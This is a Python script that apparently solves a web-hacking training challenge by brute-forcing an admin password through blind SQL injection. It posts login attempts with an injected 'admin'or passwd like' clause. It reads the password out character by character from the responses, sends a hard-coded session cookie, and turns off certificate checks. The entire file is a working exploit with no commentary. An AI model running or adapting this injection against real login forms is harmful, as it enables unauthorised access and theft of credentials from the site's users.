import requests

def login(id, pw):
    url = "https://training.zairo.kr/challenge/c4f0f5b951b88d458cc15725500ad71a/index.html"

    headers = {
        "Cookie": "challenge14_session=e1f64f2be8f0520f540f4dbf68e1e349; session=.eJyrVkpMyc3MU7JKS8wpTtVRyslPT09NiQeJlBSVAgVKi1OL4jNTlKyUUjJyMtNSDQwslaCieYm5qUDxmNKkZENTIGmcbBJTmmJmYKJUCwAe3hzw.YUVQkw.z9h015zFfut2VKDO8E7Hq4nrIRw;"
    }

    proxy = {
        'http': 'http://127.0.0.1:8888',
        'https': 'http://127.0.0.1:8888'
    }

    data = {
        'id': id,
        'passwd': pw,
    }

    r = requests.post(url, headers=headers, data=data, proxies=proxy, verify=False)
    return r.text
    
str_list = "abcdefghijklmnopqrstuvwxyz0123456789!@_"
password = ""

for i in range(20):
    for ch in str_list:
        data = login("admin'or passwd like '{}{}%'".format(password, ch), "")
        if "admin" in data:
            password += ch
            print("[*] password is ", password)
            break

